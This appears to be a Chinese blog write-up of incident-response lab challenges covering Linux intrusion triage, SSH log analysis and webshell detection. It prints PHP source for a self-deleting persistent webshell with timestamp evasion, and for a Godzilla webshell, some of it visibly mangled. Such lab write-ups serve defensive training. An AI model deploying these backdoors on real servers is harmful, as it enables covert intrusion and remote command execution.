<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">




<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

  <meta name="author" content="鱿鱼">


  <meta name="subtitle" content="鱿鱼的blog">




<title>玄机WP | 鱿鱼</title>



<link rel="icon" href="/favicon.png">



<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/nprogress/nprogress.css">



<script src="/lib/jquery.min.js"></script>


<script src="/lib/iconify-icon.min.js"></script>


<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
<script>
  tailwind.config = {
    darkMode: "class",
  };
</script>


<script src="/lib/nprogress/nprogress.js"></script>

<script>
  $(document).ready(() => {
    NProgress.configure({
      showSpinner: false,
    });
    NProgress.start();
    $("#nprogress .bar").css({
      background: "#de7441",
    });
    $("#nprogress .peg").css({
      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
    });
    $("#nprogress .spinner-icon").css({
      "border-top-color": "#de7441",
      "border-left-color": "#de7441",
    });
    setTimeout(function () {
      NProgress.done();
      $(".fade").removeClass("out");
    }, 800);
  });
</script>

<script>
  (function () {
    const prefersDark =
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches;
    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
    if (setting === "dark" || (prefersDark && setting !== "light"))
      document.documentElement.classList.toggle("dark", true);
    let isDark = document.documentElement.classList.contains("dark");
  })();

  $(document).ready(function () {
    // init icon
    const prefersDark =
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches;
    const isDark = document.documentElement.classList.contains("dark");
    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");

    function toggleGiscusTheme() {
      const isDark = document.documentElement.classList.contains("dark");
      const giscusFrame = document.querySelector("iframe.giscus-frame");
      if (giscusFrame) {
        giscusFrame.contentWindow.postMessage(
          {
            giscus: {
              setConfig: {
                theme: isDark ? "dark" : "light",
              },
            },
          },
          "https://giscus.app"
        );
      }
    }

    // toggle dark mode
    function toggleDark() {
      let isDark = document.documentElement.classList.contains("dark");
      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
      isDark = !isDark;
      document.documentElement.classList.toggle("dark", isDark);
      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
      if (prefersDark === isDark) {
        localStorage.setItem("hexo-color-scheme", "auto");
      } else {
        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
      }
      toggleGiscusTheme();
    }

    // listen dark mode change
    window
      .matchMedia("(prefers-color-scheme: dark)")
      .addEventListener("change", (e) => {
        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
        if (setting === "auto") {
          document.documentElement.classList.toggle("dark", e.matches);
          $("#theme-icon").attr(
            "icon",
            e.matches ? "ri:moon-line" : "ri:sun-line"
          );
          toggleGiscusTheme();
        }
      });

    $("#toggle-dark").click((event) => {
      const isAppearanceTransition = document.startViewTransition && !window.matchMedia('(prefers-reduced-motion: reduce)').matches
      if (!isAppearanceTransition) {
        toggleDark()
        return
      }
      const x = event.clientX
      const y = event.clientY
      const endRadius = Math.hypot(
        Math.max(x, innerWidth - x),
        Math.max(y, innerHeight - y),
      )
      const transition = document.startViewTransition(async () => {
        toggleDark()
      })

      transition.ready
        .then(() => {
          const isDark = document.documentElement.classList.contains("dark")
          const clipPath = [
            `circle(0px at ${x}px ${y}px)`,
            `circle(${endRadius}px at ${x}px ${y}px)`,
          ]
          document.documentElement.animate(
            {
              clipPath: isDark
                ? [...clipPath].reverse()
                : clipPath,
            },
            {
              duration: 400,
              easing: 'ease-out',
              pseudoElement: isDark
                ? '::view-transition-old(root)'
                : '::view-transition-new(root)',
            },
          )
        })
    });
  });
</script>




<meta name="generator" content="Hexo 7.3.0"></head>
<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
  <div class="max-auto">
    <nav class="flex items-center text-base">
      <a href="/" class="group">
        <h2 class="font-medium tracking-tighterp text-l p-2">
          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="鱿鱼" />
          鱿鱼
        </h2>
      </a>
      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
        玄机WP
      </div>
      <div class="flex-1"></div>
      <div class="flex items-center gap-3">
        
          <a class="hidden sm:flex" href="/archives">Posts</a>
        
          <a class="hidden sm:flex" href="/about">about</a>
        
        
          
            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/squid1LLL">
              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
            </a>
          
        
        <a class="w-5 h-5 hidden sm:flex" title="Github" href="rss2.xml">
          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
        </a>
        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
        </a>
      </div>
      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
        </span>
        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
        </span>
      </div>
    </nav>
  </div>
</header>
<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
      
        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
        </li>
      
        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
          <a href="/about" class="flex h-12 sm:h-auto items-center">about</a>
        </li>
      
    </ul>
  </div>
  <div class="mask bg-black/20 absolute inset-0"></div>
</div>

  <main class="pt-14">
    <!-- css -->

<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">


<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">

<!-- toc -->

  <!-- tocbot -->
<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>


<section class="px-6 max-w-prose mx-auto md:px-0">
  <!-- header -->
  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
    <div class="pt-4 md:pt-6">
      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
        玄机WP
      </h1>
      <div>
        <section class="flex items-center gap-3 text-sm">
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
            <time>2025-08-06</time>
          </span>
          <span class="text-gray-400">·</span>
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
            <span>49 min</span>
          </span>
          <span class="text-gray-400">·</span>
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
            <span>12.1k words</span>
          </span>
          
            <span class="text-gray-400">·</span>
            <span class="flex items-center gap-1">
              <iconify-icon width="16" icon="icon-park-outline:box" class="mr-2"></iconify-icon>
              <a class="article-category-link" href="/categories/WP/">WP</a>
            </span>
          
        </section>
      </div>
    </div>
  </header>
  <!-- content -->
  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
    <h1 id="DAY1"><a href="#DAY1" class="headerlink" title="DAY1"></a>DAY1</h1><h2 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="·命令："><a href="#·命令：" class="headerlink" title="·命令："></a>·命令：</h4><h5 id="find-name-php-：从根目录-开始递归查找所有扩展名为-php-的文件。"><a href="#find-name-php-：从根目录-开始递归查找所有扩展名为-php-的文件。" class="headerlink" title="find / -name &quot;*.php&quot;：从根目录 / 开始递归查找所有扩展名为 .php 的文件。"></a><code>find / -name &quot;*.php&quot;</code>：从根目录 <code>/</code> 开始递归查找所有扩展名为 <code>.php</code> 的文件。</h5><h5 id="：管道操作符，它把前一个命令的输出作为后一个命令的输入。"><a href="#：管道操作符，它把前一个命令的输出作为后一个命令的输入。" class="headerlink" title="|：管道操作符，它把前一个命令的输出作为后一个命令的输入。"></a><code>|</code>：管道操作符，它把前一个命令的输出作为后一个命令的输入。</h5><h5 id="xargs-grep-a-eval-：将-find-命令找到的文件名传递给-grep-命令，并搜索包含-eval-的行"><a href="#xargs-grep-a-eval-：将-find-命令找到的文件名传递给-grep-命令，并搜索包含-eval-的行" class="headerlink" title="xargs grep -a &quot;eval(&quot;：将 find 命令找到的文件名传递给 grep 命令，并搜索包含 &quot;eval(&quot; 的行"></a><code>xargs grep -a &quot;eval(&quot;</code>：将 <code>find</code> 命令找到的文件名传递给 <code>grep</code> 命令，并搜索包含 <code>&quot;eval(&quot;</code> 的行</h5><h5 id="使用-netstat-alntup-命令可以显示所有网络连接的详细信息。这些选项的意思如下："><a href="#使用-netstat-alntup-命令可以显示所有网络连接的详细信息。这些选项的意思如下：" class="headerlink" title="使用 netstat -alntup 命令可以显示所有网络连接的详细信息。这些选项的意思如下："></a>使用 <code>netstat -alntup</code> 命令可以显示所有网络连接的详细信息。这些选项的意思如下：</h5><h5 id="a：显示所有连接（监听和非监听）。"><a href="#a：显示所有连接（监听和非监听）。" class="headerlink" title="-a：显示所有连接（监听和非监听）。"></a><code>-a</code>：显示所有连接（监听和非监听）。</h5><h5 id="l：仅显示监听状态的连接。"><a href="#l：仅显示监听状态的连接。" class="headerlink" title="-l：仅显示监听状态的连接。"></a><code>-l</code>：仅显示监听状态的连接。</h5><h5 id="n：以数字形式显示-IP-地址和端口，而不是尝试解析它们。"><a href="#n：以数字形式显示-IP-地址和端口，而不是尝试解析它们。" class="headerlink" title="-n：以数字形式显示 IP 地址和端口，而不是尝试解析它们。"></a><code>-n</code>：以数字形式显示 IP 地址和端口，而不是尝试解析它们。</h5><h5 id="t：显示-TCP-连接。"><a href="#t：显示-TCP-连接。" class="headerlink" title="-t：显示 TCP 连接。"></a><code>-t</code>：显示 TCP 连接。</h5><h5 id="u：显示-UDP-连接。"><a href="#u：显示-UDP-连接。" class="headerlink" title="-u：显示 UDP 连接。"></a><code>-u</code>：显示 UDP 连接。</h5><h5 id="p：显示每个连接对应的程序-PID-和名称。"><a href="#p：显示每个连接对应的程序-PID-和名称。" class="headerlink" title="-p：显示每个连接对应的程序 PID 和名称。"></a><code>-p</code>：显示每个连接对应的程序 PID 和名称。</h5><h4 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">内存马，就是运行一段永远不退出的程序常驻在PHP进程里，无限执行。</span><br><span class="line">不死马.php—&gt;上传到server—&gt;server执行文件—&gt;server本地无限循环生成</span><br><span class="line">（一句话.php）</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true); //函数设置于客户机断开后，不会终止脚本的执行</span><br><span class="line">set_time_limit(0); //设置脚本的最大执行时间，0代表无限制</span><br><span class="line">unlink(__FILE__);   //删除文件本身      （隐藏的效果）</span><br><span class="line">$file = &#x27;./.index.php&#x27;;   //生成的一句木马的文件名</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[])==&quot;e771c5bd0272757ce1a75fb6c35528cb&quot;)&#123;@eval($_POST[]);&#125; ?&gt;&#x27;;</span><br><span class="line">//一句话木马的内容，这个是可以改变的</span><br><span class="line">//pass=dhskanf 马儿用法：fuckyou.php?pass=dhskanf&amp;v=command</span><br><span class="line">while (1)&#123;</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	system(&#x27;touch -m -d &quot;&quot;2018-12-01 09:10:12&quot; .index.php&#x27;);</span><br><span class="line">	//touch -m 修改文件时间，让防守方无法通过find命令来找到不死马文件。</span><br><span class="line">	usleep(1);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">变种：</span><br><span class="line">&lt;?php</span><br><span class="line">                                                                                                                                                                                      ?&gt;</span><br><span class="line"> while(true) &#123;</span><br><span class="line">     if(md5(file_get_contents($file))===md5($code)) &#123;</span><br><span class="line">     //获得文件内容与参数code进行比较，条件判断</span><br><span class="line">         file_put_contents($file, $code);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(50);</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.web目录存在木马，请找到木马的密码提交</span><br><span class="line">2.服务器疑似存在不死马，请找到不死马的密码提交</span><br><span class="line">3.不死马是通过哪个文件生成的，请提交文件名</span><br><span class="line">4.黑客留下了木马文件，请找出黑客的服务器ip提交</span><br><span class="line">5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure>

<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><h5 id="find-name-php-xargs-0-grep-eval"><a href="#find-name-php-xargs-0-grep-eval" class="headerlink" title="find ./ -name &quot;*.php&quot; | xargs -0 grep &quot;eval(&quot;"></a><code>find ./ -name &quot;*.php&quot; | xargs -0 grep &quot;eval(&quot;</code></h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1908c9b.png" alt="1754467093752.png"></h5><h5 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1b19669.png" alt="1754467093752.png"></h5><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><h5 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1908c9b.png" alt="1754467093752.png"></h5><h4 id="密码就是MD5解密后的结果"><a href="#密码就是MD5解密后的结果" class="headerlink" title="密码就是MD5解密后的结果"></a>密码就是MD5解密后的结果</h4><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><h4 id="4-5。"><a href="#4-5。" class="headerlink" title="4&amp;&amp;5。"></a>4&amp;&amp;5。</h4><h5 id="看到有shell-1-elf文件，运行它"><a href="#看到有shell-1-elf文件，运行它" class="headerlink" title="看到有shell(1).elf文件，运行它"></a>看到有shell(1).elf文件，运行它</h5><h5 id="netstat-alntup-命令可以显示所有网络连接"><a href="#netstat-alntup-命令可以显示所有网络连接" class="headerlink" title="netstat -alntup 命令可以显示所有网络连接"></a><code>netstat -alntup</code> 命令可以显示所有网络连接</h5><h5 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1b4aee4.png" alt="1754467093752.png"></h5><h4 id="IP和端口都在"><a href="#IP和端口都在" class="headerlink" title="IP和端口都在"></a>IP和端口都在</h4><h2 id="第一章-应急响应-Linux日志分析"><a href="#第一章-应急响应-Linux日志分析" class="headerlink" title="第一章 应急响应-Linux日志分析"></a>第一章 应急响应-Linux日志分析</h2><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h4><h5 id="使用grep，awk提取用户名"><a href="#使用grep，awk提取用户名" class="headerlink" title="使用grep，awk提取用户名"></a>使用grep，awk提取用户名</h5><h6 id="grep-a-Failed-password-var-log-auth-log-awk-print-11"><a href="#grep-a-Failed-password-var-log-auth-log-awk-print-11" class="headerlink" title="grep -a &quot;Failed password&quot; /var/log/auth.log | awk &#39;{print $11}&#39;"></a><code>grep -a &quot;Failed password&quot; /var/log/auth.log | awk &#39;&#123;print $11&#125;&#39;</code></h6><h5 id="统计用户名出现次数："><a href="#统计用户名出现次数：" class="headerlink" title="统计用户名出现次数："></a>统计用户名出现次数：</h5><h5 id="grep-a-Failed-password-var-log-auth-log-awk-print-11-sort-uniq-c-sort-nr"><a href="#grep-a-Failed-password-var-log-auth-log-awk-print-11-sort-uniq-c-sort-nr" class="headerlink" title="grep -a &quot;Failed password&quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr"></a><code>grep -a &quot;Failed password&quot; /var/log/auth.log | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr</code></h5><h5 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1bb6fd7.png" alt="1754467093752.png"></h5><h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure>

<h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><h5 id="cat-var-log-auth-log-grep-a-Failed-password-for-root"><a href="#cat-var-log-auth-log-grep-a-Failed-password-for-root" class="headerlink" title="cat  /var/log/auth.log | grep -a &quot;Failed password for root&quot;"></a><code>cat  /var/log/auth.log | grep -a &quot;Failed password for root&quot;</code></h5><h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><h5 id="cat-var-log-auth-log-grep-a-Accepted-password"><a href="#cat-var-log-auth-log-grep-a-Accepted-password" class="headerlink" title="cat  /var/log/auth.log |grep -a &quot;Accepted password&quot;"></a><code>cat  /var/log/auth.log |grep -a &quot;Accepted password&quot;</code></h5><h4 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h4><h5 id="cat-var-log-auth-log-grep-a-Failed-password-awk-print-11"><a href="#cat-var-log-auth-log-grep-a-Failed-password-awk-print-11" class="headerlink" title="cat  /var/log/auth.log | grep -a &quot;Failed password&quot;| awk &#39;{print $11}&#39;||"></a><code>cat  /var/log/auth.log | grep -a &quot;Failed password&quot;| awk &#39;&#123;print $11&#125;&#39;</code>||</h5><h5 id="cat-var-log-auth-log-grep-a-Failed-password-（需要找一下）"><a href="#cat-var-log-auth-log-grep-a-Failed-password-（需要找一下）" class="headerlink" title="cat /var/log/auth.log | grep -a &quot;Failed password&quot; （需要找一下）"></a><code>cat /var/log/auth.log | grep -a &quot;Failed password&quot;</code> （需要找一下）</h5><h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><h5 id="cat-var-log-auth-log-grep-a-Failed-password-awk-print-11-sort-uniq-c-sort-nr"><a href="#cat-var-log-auth-log-grep-a-Failed-password-awk-print-11-sort-uniq-c-sort-nr" class="headerlink" title="cat  /var/log/auth.log | grep -a &quot;Failed password&quot;| awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr  "></a><code>cat  /var/log/auth.log | grep -a &quot;Failed password&quot;| awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr  </code></h5><h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><h5 id="cat-var-log-auth-log-grep-a-new-user"><a href="#cat-var-log-auth-log-grep-a-new-user" class="headerlink" title="cat  /var/log/auth.log|grep -a &quot;new user&quot;"></a><code>cat  /var/log/auth.log|grep -a &quot;new user&quot;</code></h5><h1 id="DAY2"><a href="#DAY2" class="headerlink" title="DAY2"></a>DAY2</h1><h2 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="webshell和木马的区别"><a href="#webshell和木马的区别" class="headerlink" title="webshell和木马的区别"></a>webshell和木马的区别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">载体不同：WebShell 通常通过Web服务器进行传播和执行，而木马则通过各种方式让用户主动下载并执行。</span><br><span class="line">目的不同：WebShell 主要是为了远程控制Web服务器，而木马的目的更为多样，包括数据窃取、系统破坏等。</span><br><span class="line">触发方式不同：WebShell 通常由HTTP请求触发执行，而木马则是在用户的计算机上执行。</span><br></pre></td></tr></table></figure>

<h4 id="经典的哥斯拉PHP马的特征"><a href="#经典的哥斯拉PHP马的特征" class="headerlink" title="经典的哥斯拉PHP马的特征"></a>经典的哥斯拉PHP马的特征</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start() 创建或者重启一个会话</span><br><span class="line">@set_time_limit(0) 设置程序最长运行时间 永远</span><br><span class="line">@error_reporting(0) 关闭错误报告</span><br><span class="line">$key=xxxxxxxxx 加解密的盐值</span><br></pre></td></tr></table></figure>

<h4 id="php免杀马"><a href="#php免杀马" class="headerlink" title="php免杀马"></a>php免杀马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常字符串异或加密、base家族加密、rot13加密 字符串拼接等方式实现</span><br></pre></td></tr></table></figure>



<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h4><h5 id="find-name-php-xargs-0-grep-eval-使用这条命令可以看到包含eval-的php文件，然后再gz-php看到里面的flag的"><a href="#find-name-php-xargs-0-grep-eval-使用这条命令可以看到包含eval-的php文件，然后再gz-php看到里面的flag的" class="headerlink" title="find ./ -name &quot;*.php&quot; | xargs -0 grep &quot;eval(&quot;使用这条命令可以看到包含eval(的php文件，然后再gz.php看到里面的flag的"></a><code>find ./ -name &quot;*.php&quot; | xargs -0 grep &quot;eval(&quot;</code>使用这条命令可以看到包含eval(的php文件，然后再gz.php看到里面的flag的</h5><h5 id="也可以用D盾和火绒去扫描"><a href="#也可以用D盾和火绒去扫描" class="headerlink" title="也可以用D盾和火绒去扫描"></a>也可以用D盾和火绒去扫描</h5><h4 id="2-在gz-php看到"><a href="#2-在gz-php看到" class="headerlink" title="2.在gz.php看到"></a>2.在gz.php看到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $c = $K[];</span><br><span class="line">        $D[] = $D[]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class="line">$data=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if ($data!==false)&#123;</span><br><span class="line">    $data=encode($data,$key);</span><br><span class="line">    if (isset($_SESSION[]))&#123;</span><br><span class="line">        $payload=encode($_SESSION[],$key);</span><br><span class="line">        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;</span><br><span class="line">            $payload=encode($payload,$key);</span><br><span class="line">        &#125;</span><br><span class="line">                eval($payload);</span><br><span class="line">        echo encode(@run($data),$key);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class="line">            $_SESSION[]=encode($data,$key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="https-github-com-BeichenDream-Godzilla-github地址"><a href="#https-github-com-BeichenDream-Godzilla-github地址" class="headerlink" title="https://github.com/BeichenDream/Godzilla github地址"></a><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a> github地址</h5><h4 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h4><p><img src="https://free.picui.cn/free/2025/08/06/68930b1e0bcc5.png" alt="1754467093753.png"></p>
<h5 id="同样扫出来得那个-mysqli-php就是，或者在-var-www-html-include-Db下ls-a可以看到-mysqli-php的文件"><a href="#同样扫出来得那个-mysqli-php就是，或者在-var-www-html-include-Db下ls-a可以看到-mysqli-php的文件" class="headerlink" title="同样扫出来得那个.mysqli.php就是，或者在\var\www\html\include\Db下ls -a可以看到.mysqli.php的文件"></a>同样扫出来得那个.mysqli.php就是，或者在\var\www\html\include\Db下<code>ls -a</code>可以看到.mysqli.php的文件</h5><h4 id="4-1"><a href="#4-1" class="headerlink" title="4."></a>4.</h4><h4 id="根据免杀马的特征使用"><a href="#根据免杀马的特征使用" class="headerlink" title="根据免杀马的特征使用"></a>根据免杀马的特征使用</h4><h5 id="find-name-php-xargs-grep-a-base64-decode-可以看到"><a href="#find-name-php-xargs-grep-a-base64-decode-可以看到" class="headerlink" title="find / -name &quot;*.php&quot; |  xargs grep -a &quot;base64_decode&quot;可以看到"></a><code>find / -name &quot;*.php&quot; |  xargs grep -a &quot;base64_decode&quot;</code>可以看到</h5><h1 id="DAY3"><a href="#DAY3" class="headerlink" title="DAY3"></a>DAY3</h1><h2 id="第二章日志分析-mysql应急响应"><a href="#第二章日志分析-mysql应急响应" class="headerlink" title="第二章日志分析-mysql应急响应"></a>第二章日志分析-mysql应急响应</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://t.csdnimg.cn/leR9J   //这篇文章讲的很清晰</span><br></pre></td></tr></table></figure>

